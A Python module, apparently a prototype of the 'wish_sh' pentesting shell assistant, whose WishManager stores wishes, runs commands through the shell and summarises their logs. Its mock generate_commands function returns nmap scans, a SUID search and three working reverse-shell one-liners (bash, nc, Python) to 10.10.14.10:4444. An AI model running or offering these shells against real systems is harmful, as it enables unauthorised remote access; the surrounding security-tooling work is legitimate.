import json
import subprocess
import time
from typing import Dict, List, Optional, Tuple

from wish_models import CommandResult, CommandState, LogFiles, Wish, WishState

from wish_sh.settings import Settings
from wish_sh.wish_paths import WishPaths


class WishManager:
    """Core functionality for wish."""

    def __init__(self, settings: Settings):
        self.settings = settings
        self.paths = WishPaths(settings)
        self.paths.ensure_directories()
        self.current_wish: Optional[Wish] = None
        self.running_commands: Dict[int, Tuple[subprocess.Popen, CommandResult, Wish]] = {}

    def save_wish(self, wish: Wish):
        """Save wish to history file."""
        with open(self.paths.history_path, "a") as f:
            f.write(json.dumps(wish.to_dict()) + "\n")

    def load_wishes(self, limit: int = 10) -> List[Wish]:
        """Load recent wishes from history file."""
        wishes = []
        try:
            with open(self.paths.history_path, "r") as f:
                lines = f.readlines()
                for line in reversed(lines[-limit:]):
                    wish_dict = json.loads(line.strip())
                    wish = Wish.create(wish_dict["wish"])
                    wish.id = wish_dict["id"]
                    wish.state = wish_dict["state"]
                    wish.created_at = wish_dict["created_at"]
                    wish.finished_at = wish_dict["finished_at"]
                    # (simplified: not loading command results for prototype)
                    wishes.append(wish)
        except (FileNotFoundError, json.JSONDecodeError):
            pass
        return wishes

    def generate_commands(self, wish_text: str) -> List[str]:
        """Generate commands based on wish text (mock implementation)."""
        # In a real implementation, this would call an LLM
        # For prototype, return some predefined responses based on keywords
        commands = []
        wish_lower = wish_text.lower()

        if "scan" in wish_lower and "port" in wish_lower:
            commands = [
                "sudo nmap -p- -oA tcp 10.10.10.40",
                "sudo nmap -n -v -sU -F -T4 --reason --open -T4 -oA udp-fast 10.10.10.40",
            ]
        elif "find" in wish_lower and "suid" in wish_lower:
            commands = ["find / -perm -u=s -type f 2>/dev/null"]
        elif "reverse shell" in wish_lower or "revshell" in wish_lower:
            commands = [
                "bash -c 'bash -i >& /dev/tcp/10.10.14.10/4444 0>&1'",
                "nc -e /bin/bash 10.10.14.10 4444",
                "python3 -c 'import socket,subprocess,os;"
                "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
                's.connect(("10.10.14.10",4444));'
                "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
                'subprocess.call(["/bin/sh","-i"]);\'',
            ]
        else:
            # Default responses
            commands = [f"echo 'Executing wish: {wish_text}'", f"echo 'Processing {wish_text}' && ls -la"]

        return commands

    def execute_command(self, wish: Wish, command: str, cmd_num: int):
        """Execute a command and capture its output."""

        # Create log directories and files
        log_dir = self.paths.create_command_log_dirs(wish.id)
        stdout_path = log_dir / f"{cmd_num}.stdout"
        stderr_path = log_dir / f"{cmd_num}.stderr"
        log_files = LogFiles(stdout=stdout_path, stderr=stderr_path)

        # Create command result
        result = CommandResult.create(cmd_num, command, log_files)
        wish.command_results.append(result)

        with open(stdout_path, "w") as stdout_file, open(stderr_path, "w") as stderr_file:
            try:
                # Start the process
                process = subprocess.Popen(command, stdout=stdout_file, stderr=stderr_file, shell=True, text=True)

                # Store in running commands dict
                self.running_commands[cmd_num] = (process, result, wish)

                # Wait for process completion (non-blocking return for UI)
                return

            except Exception as e:
                stderr_file.write(f"Failed to execute command: {str(e)}")

                # Mark the command as failed
                result.finish(
                    exit_code=1,
                    state=CommandState.OTHERS,
                    log_summarizer=self.summarize_log
                )

                # Update the command result in the wish object
                wish.update_command_result(result)

    def summarize_log(self, log_files: LogFiles) -> str:
        """Generate a simple summary of command logs."""
        summary = []

        # Read stdout
        try:
            with open(log_files.stdout, "r") as f:
                stdout_content = f.read().strip()
                if stdout_content:
                    lines = stdout_content.split("\n")
                    if len(lines) > 10:
                        summary.append(f"Standard output: {len(lines)} lines")
                        summary.append("First few lines:")
                        summary.extend(lines[:3])
                        summary.append("...")
                        summary.extend(lines[-3:])
                    else:
                        summary.append("Standard output:")
                        summary.extend(lines)
                else:
                    summary.append("Standard output: <empty>")
        except FileNotFoundError:
            summary.append("Standard output: <file not found>")

        # Read stderr
        try:
            with open(log_files.stderr, "r") as f:
                stderr_content = f.read().strip()
                if stderr_content:
                    lines = stderr_content.split("\n")
                    if len(lines) > 5:
                        summary.append(f"Standard error: {len(lines)} lines")
                        summary.append("First few lines:")
                        summary.extend(lines[:3])
                        summary.append("...")
                    else:
                        summary.append("Standard error:")
                        summary.extend(lines)

        except FileNotFoundError:
            pass  # Don't mention if stderr is empty or missing

        return "\n".join(summary)

    def check_running_commands(self):
        """Check status of running commands and update their status."""
        for idx, (process, result, wish) in list(self.running_commands.items()):
            if process.poll() is not None:  # Process has finished
                # Determine the state based on exit code
                state = CommandState.SUCCESS if process.returncode == 0 else CommandState.OTHERS

                # Mark the command as finished
                result.finish(
                    exit_code=process.returncode,
                    state=state,
                    log_summarizer=self.summarize_log
                )

                # Update the command result in the wish object
                wish.update_command_result(result)

                # Remove from running commands
                del self.running_commands[idx]

    def cancel_command(self, wish: Wish, cmd_index: int):
        """Cancel a running command."""
        if cmd_index in self.running_commands:
            process, result, _ = self.running_commands[cmd_index]

            # Try to terminate the process
            try:
                process.terminate()
                time.sleep(0.5)
                if process.poll() is None:  # Process still running
                    process.kill()  # Force kill
            except Exception:
                pass  # Ignore errors in termination

            # Mark the command as cancelled
            result.finish(
                exit_code=-1,  # Use -1 for cancelled commands
                state=CommandState.USER_CANCELLED,
                log_summarizer=self.summarize_log
            )

            # Update the command result in the wish object
            wish.update_command_result(result)

            del self.running_commands[cmd_index]

            return f"Command {cmd_index} cancelled."
        else:
            return f"Command {cmd_index} is not running."

    def format_wish_list_item(self, wish: Wish, index: int) -> str:
        """Format a wish for display in wishlist."""
        if wish.state == WishState.DONE and wish.finished_at:
            return (
                f"[{index}] wish: {wish.wish[:30]}"
                f"{'...' if len(wish.wish) > 30 else ''}  "
                f"(started at {wish.created_at} ; done at {wish.finished_at})"
            )
        else:
            return (
                f"[{index}] wish: {wish.wish[:30]}"
                f"{'...' if len(wish.wish) > 30 else ''}  "
                f"(started at {wish.created_at} ; {wish.state})"
            )
